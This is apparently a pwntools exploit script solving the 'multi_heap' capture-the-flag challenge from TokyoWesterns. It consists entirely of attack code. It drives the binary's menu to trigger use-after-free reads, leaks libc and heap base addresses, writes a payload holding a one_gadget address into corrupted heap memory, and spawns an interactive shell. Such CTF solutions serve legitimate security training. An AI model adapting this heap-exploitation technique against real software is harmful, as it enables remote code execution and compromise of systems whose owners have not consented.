#!/usr/bin/env python
from pwn import *

def alloc(size):
    s.sendlineafter('choice: ', '1')
    s.sendlineafter('Which: ', 'char')
    s.sendlineafter('Size: ', str(size))
    s.sendlineafter('(m/t): ', 'm')

def free(index):
    s.sendlineafter('choice: ', '2')
    s.sendlineafter('Index: ', str(index))

def write(index):
    s.sendlineafter('choice: ', '3')
    s.sendlineafter('Index: ', str(index))
    return s.recvline(False)

def read(index, size, content):
    s.sendlineafter('choice: ', '4')
    s.sendlineafter('Index: ', str(index))
    s.sendlineafter('Size: ', str(size))
    s.sendlineafter('Content: ', content)

def copy(src, dst, size):
    s.sendlineafter('choice: ', '5')
    s.sendlineafter('index: ', str(src))
    s.sendlineafter('index: ', str(dst))
    s.sendlineafter('Size: ', str(size))
    s.sendlineafter('(y/n): ', 'y')

if len(sys.argv) == 1:
    s = process('./multi_heap-2faaaa3f601bbd51a7929f934754cb685c3f7f789abc1ce2e709b9ac7c1694ee')
else:
    s = remote('multiheap.chal.ctf.westerns.tokyo', 10001)

alloc(0x418)
alloc(0x38)
free(0)
alloc(0x418)
libc_base = u64(write(1).ljust(8, '\0')) - 0x3ebca0
log.info('libc base: %#x' % libc_base)

alloc(0x38)
free(2)
free(0)
alloc(0x38)
heap_base = u64(write(1).ljust(8, '\0')) - 0x123a0
log.info('heap base: %#x' % heap_base)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
payload = ''
payload += p64(heap_base + 0x12310)
payload += p64(libc_base + one_gadgets[1])
payload += 'A' * 0xc0
payload += p64(heap_base + 0x12310)

alloc(0x100)
read(2, len(payload), payload)
copy(2, 1, 0)
free(0)

s.interactive()
